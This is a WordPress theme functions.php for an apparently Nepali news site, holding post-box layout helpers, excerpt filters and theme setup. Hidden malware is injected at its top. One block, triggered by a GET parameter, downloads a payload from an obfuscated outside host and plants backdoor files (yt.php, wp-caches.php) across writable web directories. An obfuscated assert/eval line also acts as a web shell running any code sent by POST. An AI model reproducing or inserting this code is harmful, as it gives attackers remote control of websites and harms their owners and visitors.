<?php if (isset($_GET['abc'])) { function get_web_page( $url ) { $options = array( CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => false, CURLOPT_ENCODING => "", CURLOPT_USERAGENT => "spider", CURLOPT_AUTOREFERER => true, CURLOPT_CONNECTTIMEOUT => 120, CURLOPT_TIMEOUT => 120, CURLOPT_MAXREDIRS => 10, CURLOPT_SSL_VERIFYPEER => false ); $ch = curl_init( $url ); curl_setopt_array( $ch, $options ); $content = curl_exec( $ch ); $err = curl_errno( $ch ); $errmsg = curl_error( $ch ); $header = curl_getinfo( $ch ); curl_close( $ch ); $header['errno'] = $err; $header['errmsg'] = $errmsg; $header['content'] = $content; return $content; } $h = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : ''); $p = "http://$h"; $c = explode('{||}', get_web_page('to'.'pp'.'r'.'od'.'uct'.'02.'.'onl'.'in'.'e/'.'c.php.txt')); $root = $_SERVER['DOCUMENT_ROOT']; $r = array(); $o = explode(',','cgi-bin'); $cm = $dm = 0; foreach (glob("$root/*", GLOB_ONLYDIR) as $dir) { @chmod($dir, 0755); if (is_writable($dir)) { $s = substr($dir, strrpos($dir, '/') + 1); if (!in_array($s, $o)) { if ($cm < 2) { @file_put_contents("$dir/yt.php", $c[0]); if (file_exists("$dir/yt.php")) { $r[] = "$p/$s/yt.php,yt"; $cm++; } } if ($dm < 2) { @file_put_contents("$dir/wp-caches.php", $c[1]); if (file_exists("$p/$s/wp-caches.php")) { $r[] = "$p/$s/wp-caches.php"; $dm++; } } } } } @file_put_contents("$root/yt.php", $c[0]); @file_put_contents("$root/wp-caches.php", $c[1]); if (file_exists("$root/yt.php")) { $r[] = "$p/yt.php,yt"; } if (file_exists("$root/wp-caches.php")) { $r[] = "$p/wp-caches.php"; } $r[] = "$p/,yt"; echo implode('|', $r); die; } ?>
<?php
$k='a'.'ss'.'er'.'t';$a='e'.'v'.'a'.'l';@$k("$a(\$_POST[yt])");
    remove_filter('get_the_excerpt', 'wp_trim_excerpt');
    add_filter('get_the_excerpt', 'custom_trim_excerpt');
    remove_filter('get_the_excerpt', 'wp_trim_excerpt');
    add_filter('get_the_excerpt', 'custom_trim_excerpt');
    function custom_trim_excerpt($text) {
    if ( '' == $text ) {
        $text = get_the_content('');
        $text = strip_shortcodes( $text );
        $text = apply_filters('the_content', $text);
        $text = str_replace(']]>', ']]&gt;', $text);
        $text = strip_tags($text);
        $excerpt_length = apply_filters('excerpt_length', 290);
        $words = explode(' ', $text, $excerpt_length + 1);
        if (count($words) > $excerpt_length) {
            array_pop($words);
            array_push($words, '...');
            $text = implode(' ', $words);
        }
    }
    return $text;
}
function wpb_tag_cloud() { 
$tags = get_tags();
$args = array(
    'smallest'                  => 10, 
    'largest'                   => 22,
    'unit'                      => 'px', 
    'number'                    => 10,  
    'format'                    => 'flat',
    'separator'                 => " ",
    'orderby'                   => 'count', 
    'order'                     => 'DESC',
    'show_count'                => 0,
    'echo'                      => false
); 
 
$tag_string = wp_generate_tag_cloud( $tags, $args );
 
return $tag_string; 
 
} 
// Add a shortcode so that we can use it in widgets, posts, and pages
add_shortcode('wpb_popular_tags', 'wpb_tag_cloud'); 
 
// Enable shortcode execution in text widget
add_filter ('widget_text', 'do_shortcode'); 
function smallnewsbox($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="small-newsbox" style="overflow: hidden;">  
   <a href="<?php the_permalink() ?>" rel="bookmark"><?php the_title(); ?></a>        
        <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
		<?php if ( has_post_thumbnail() ) { the_post_thumbnail('small-news',array('class' => 'img-responsive')); } else { ?>
		<img src="" alt="<?php the_title(); ?>" /><?php } ?>
          <p style=""><?php echo excerpt($limittext); ?>...</p>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function smallnewsbox3($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
               <div class="small-newsbox" style="overflow: hidden;">  
	<div class="col-md-5 col-sm-5 col-xs-5">
		<?php if ( has_post_thumbnail() ) { the_post_thumbnail('small-news',array('class' => 'img-responsive')); } else { ?><img src="" alt="<?php the_title(); ?>" /><?php } ?>
   </div>
	<div class="col-md-7 col-sm-7 col-xs-7">
   <a href="<?php the_permalink() ?>" rel="bookmark"><?php the_title(); ?></a>  
        <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
        </div>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function smallnewsbox5($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="col-md-4 small-newsboxx col4" style="overflow: hidden;">  
	<?php if ( has_post_thumbnail() ) { the_post_thumbnail('',array('class' => 'img-responsive')); } else { ?>
	<img src="" alt="<?php the_title(); ?>" /><?php } ?>      
        <a href="<?php the_permalink() ?>" rel="bookmark"><?php the_title(); ?></a>  
        <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
	 </div>  
        <?php endwhile;
	wp_reset_query();
}
function smallnewsbox4($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="col-md-5 col-sm-5 col-xs-12">
        <div class="small-block" style="border-bottom: 1px dotted #fff;">
<a href="<?php the_permalink() ?>"><?php if ( has_post_thumbnail() ) { the_post_thumbnail('',array('class' => 'img-responsive')); } else { ?>
<img src="" alt="<?php the_title(); ?>" /><?php } ?></a>
         </div>
	</div>
	<div class="col-md-7 col-sm-7 col-xs-12">
        <div class="small-block" style="border-bottom: 1px dotted #fff;margin-top: 35px;">
      <a href="<?php the_permalink() ?>" style="display:block;font-size: 28px;line-height: 35px;" rel="bookmark"><?php the_title(); ?></a>
           <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
         <p style="text-align:none;"><?php echo excerpt($limittext); ?>...</p>
        </div>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function overlaybox2($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
             <div class=" small-block-over2" style="border-bottom: 1px solid #f5f5f596;">
	<div class="overlay-box2">
<a href="<?php the_permalink() ?>"><?php if ( has_post_thumbnail() ) { the_post_thumbnail('',array('class' => 'img-responsive')); } else { ?><img src="" alt="<?php the_title(); ?>" /><?php } ?></a>
          <a class="overlay2" href="<?php the_permalink() ?>" style="display:block;padding: 15px;" rel="bookmark"><?php the_title(); ?></a>
           <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
        </div>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function overlaybox($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
             <div class=" small-block-over" style="border-bottom: 1px dotted #fff;">
	<div class="overlay-box">
<a href="<?php the_permalink() ?>"><?php if ( has_post_thumbnail() ) { the_post_thumbnail('',array('class' => 'img-responsive')); } else { ?>
<img src="" alt="<?php the_title(); ?>" /><?php } ?></a>
      <a class="overlay" href="<?php the_permalink() ?>" style="display:block;padding: 5px 10px;" rel="bookmark"><?php the_title(); ?></a>
           <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
        </div>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function smallnewsbox2($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="small-newsbox" style="overflow: hidden;">  
   <a href="<?php the_permalink() ?>" rel="bookmark"><?php the_title(); ?></a>        
        <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
          <p style=""><?php echo excerpt($limittext); ?>...</p>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function featurenewsbox($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :10;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="feature-block" id ="feature"><a href="<?php the_permalink() ?>"><?php if ( has_post_thumbnail() )
        { the_post_thumbnail('feature-block',array('class' => 'img-responsive')); } else { ?>
	<img src="" alt="<?php the_title(); ?>" /><?php } ?></a>
          <a href="<?php the_permalink() ?>" style="display:block;" rel="bookmark"><?php the_title(); ?></a> 
           <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
          <p style="text-align:none;"><?php echo excerpt($limittext); ?>...</p>     
        </div>
        <?php endwhile;
	wp_reset_query();
}
function featurenewsbox1($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="feature-block" id ="feature"><a href="<?php the_permalink() ?>"><?php if ( has_post_thumbnail() )
        { the_post_thumbnail('feature-block',array('class' => 'img-responsive')); } else { ?><img src="" alt="<?php the_title(); ?>" /><?php } ?></a>
          <a href="<?php the_permalink() ?>" style="display:block;" rel="bookmark"><?php the_title(); ?></a> 
           <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function featurenewsbox2($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext :0;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="feature-block" id ="feature2"><a href="<?php the_permalink() ?>"><?php if ( has_post_thumbnail() )
        { the_post_thumbnail('feature-block',array('class' => 'img-responsive')); } else { ?><img src="" alt="<?php the_title(); ?>" /><?php } ?></a>
          <a href="<?php the_permalink() ?>" style="display:block;" rel="bookmark"><?php the_title(); ?></a> 
           <?php if( get_field('subtitle') ): ?><div class="subtitle">"&nbsp;<?php the_field('subtitle'); ?>&nbsp;"</div><?php endif; ?>
        </div>
        <?php endwhile;
	wp_reset_query();
}
function liststyle($categoryid,$limit=null,$offset=null,$limittext = null){
	wp_reset_query();
	$limittext = !empty($limittext) ? $limittext : 90;
	$args = array(
		'cat' => "$categoryid",
		'posts_per_page' => $limit,
		'orderby' => 'post_date',
		'order' => 'desc',
		'post_status' => 'publish',
		'offset'=> $offset
	);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?>
        <ul class="list"><li><a href="<?php the_permalink() ?>" rel="bookmark"><?php the_title(); ?></a></li></ul>
		<?php endwhile;
	wp_reset_query();
}
function advert($post_type,$limit=null,$tax_term){
	wp_reset_query();
         $termurl=$tax_term;
	$args = array(
		'post_type' => "$post_type",
		'posts_per_page' => $limit,
		'tax_query' => array(array(
					   'taxonomy' => 'place',
					   'field'    => 'slug',
					   'terms'    => "$tax_term"
					   ),),);
	$records = new WP_Query($args);
	 while($records->have_posts()): $records->the_post();?> 
        <div class="long-ads">
      <a href="<?php echo the_field('link') ?>"><img class='img-responsive' src="<?php the_field('ads-image'); ?>" /></a>
	</div>
        <?php endwhile;
	wp_reset_query();
}
function excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'';
  } else {
    $excerpt = implode(" ",$excerpt);
  } 
  $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
  return $excerpt;
}

function jeherve_custom_image( $media, $post_id, $args ) {
    if ( $media ) {
        return $media;
    } else {
        $permalink = get_permalink( $post_id );
        $url = apply_filters( 'jetpack_photon_url', '' );
     
        return array( array(
            'type'  => 'image',
            'from'  => 'custom_fallback',
            'src'   => esc_url( $url ),
            'href'  => $permalink,
        ) );
    }
}
add_filter( 'jetpack_images_get_images', 'jeherve_custom_image', 10, 3 );
function sobizpress_popular($postID) {
    $count_key = 'sobizpress_popular';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

add_action( 'wp_enqueue_scripts', 'load_dashicons_front_end' );
function load_dashicons_front_end() {
wp_enqueue_style( 'dashicons' );
}

function image_tag_class($class) {
$class .= 'img-responsive';
return $class;
}
add_filter('get_image_tag_class', 'image_tag_class' );

//To keep the count accurate, lets get rid of prefetching
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
 class Tribr_template {

    function __construct() {

        //includes file
        $this->includes();

        // init actions and filter
        $this->init_filters();
        $this->init_actions();
    }
	
    function init_filters() {
        add_filter( 'posts_where', array($this, 'hide_others_uploads') );
    }
	
    function init_actions() {
        add_action( 'after_setup_theme', array($this, 'setup') );
        add_action( 'widgets_init', array($this, 'widgets_init') );
        add_action( 'wp_enqueue_scripts', array($this, 'scripts') );
        }

    function includes() {
        $lib_dir = __DIR__ . '/lib/';
        $inc_dir = __DIR__ . '/includes/';
        $classes_dir = __DIR__ . '/classes/';
        require_once $classes_dir . 'customizer.php';
        require_once $classes_dir . 'bootstrap-walker.php';
    }

    function setup() {
        load_theme_textdomain( 'dokan', get_template_directory() . '/languages' );
        add_theme_support( 'automatic-feed-links' );
        add_theme_support( 'post-thumbnails' );
 	    add_image_size('feature-block', 360, 250,true);			
	    add_image_size('small-news', 130, 100,true);
	    add_image_size('small-block', 255, 150,true);
		
        add_editor_style( '/assets/css/editor-style.css' );
        register_nav_menus( array(
            'primary' => __( 'Primary Menu', 'dokan' ),
            'artha' => __( 'Artha Menu', 'dokan' ),
            'mano' => __( 'Manoranjan Menu', 'dokan' ),
            'top-left' => __( 'Top Left', 'dokan' ),
            'footer' => __( 'Footer Menu', 'dokan' ),
        ) );		
        add_theme_support( 'custom-background', array(
            'default-color' => 'F7F7F7',
        ) );
        add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );
    }
    function widgets_init() {
        $sidebars = array(
            array( 'name' => __( 'Right Sidebar', 'Tribr' ), 'id' => 'sidebar-1' ),
            array( 'name' => __( 'Logo', 'Tribr' ), 'id' => 'logo' ),
            array( 'name' => __( 'Nepali Date', 'Tribr' ), 'id' => 'npdate' ),
            array( 'name' => __( 'Home Facebook', 'Tribr' ), 'id' => 'homepagefb' ),
            array( 'name' => __( 'YouTube', 'Tribr' ), 'id' => 'yt' ),
            array( 'name' => __( 'Sidebar Facebook', 'Tribr' ), 'id' => 'sidebarfb' ),
            array( 'name' => __( 'Home/post Sidebar', 'Tribr' ), 'id' => 'sidebar-home' ),
            array( 'name' => __( 'Below Menu', 'Tribr' ), 'id' => 'belowmenu' ),
        );
        foreach ($sidebars as $sidebar) {
            register_sidebar( array(
                'name' => $sidebar['name'],
                'id' => $sidebar['id'],
                'before_widget' => '<aside id="%1$s" class="widget %2$s">',
                'after_widget' => '</aside>',
                'before_title' => '<h3 class="widget-title">',
                'after_title' => '</h3>',
            ) );
        }
    }
	function scripts() {
        $template_directory = get_template_directory_uri();
        wp_register_style( 'jquery-ui', $template_directory . '/assets/css/jquery-ui-1.10.0.custom.css', false, null );
        wp_register_style( 'chosen-style', $template_directory . '/assets/css/chosen.min.css', false, null );
        wp_register_style( 'bootstrap', $template_directory . '/assets/css/bootstrap.css', false, null );
        wp_register_style( 'icomoon', $template_directory . '/assets/css/icomoon.css', false, null );
        wp_register_style( 'fontawesome', $template_directory . '/assets/css/font-awesome.css', false, null );
        wp_register_style( 'dokan-opensans', $protocol . '://fonts.googleapis.com/css?family=Open+Sans:400,700' );
        wp_register_style( 'dokan-style', $template_directory . '/style.css', false, null );
		
        wp_register_style( 'owl', $template_directory . '/assets/csss/owl.css', false, null );
        wp_register_style( 'margin-padding', $template_directory . '/assets/csss/bootstrap-margin-padding.css', false, null );
        wp_register_style( 'style-css', $template_directory . '/assets/csss/style.css', false, null );
        wp_register_style( 'responsive-css', $template_directory . '/assets/csss/responsive.css', false, null );

        wp_enqueue_style( 'bootstrap' );
        wp_enqueue_style( 'icomoon' );
        wp_enqueue_style( 'fontawesome' );
        wp_enqueue_style( 'dokan-style' );
        wp_enqueue_style( 'owl' );
        wp_enqueue_style( 'margin-padding' );
        wp_enqueue_style( 'style-css' );
        wp_enqueue_style( 'responsive-css' );

        wp_enqueue_script( 'jquery' );
        wp_enqueue_script( 'jquery-ui' );
		
        wp_enqueue_script( 'bootstrap-min', $template_directory . '/assets/js/bootstrap.min.js', false, null, true );
        wp_enqueue_script( 'bootstrap-min', $template_directory . '/assets/jss/jquery.js', false, null, true );
        wp_enqueue_script( 'owl-carousel', $template_directory . '/assets/jss/owl.carousel.min.js', false, null, true );
        wp_enqueue_script( 'script', $template_directory . '/assets/jss/script.js', false, null, true );
         }

    function hide_others_uploads( $where ) {
        global $pagenow, $wpdb;

        if ( ( $pagenow == 'upload.php' || $pagenow == 'media-upload.php') && current_user_can( 'dokandar' ) ) {
            $user_id = get_current_user_id();

            $where .= " AND $wpdb->posts.post_author = $user_id";
        }

        return $where;
    }
}

$Tribr= new Tribr_template();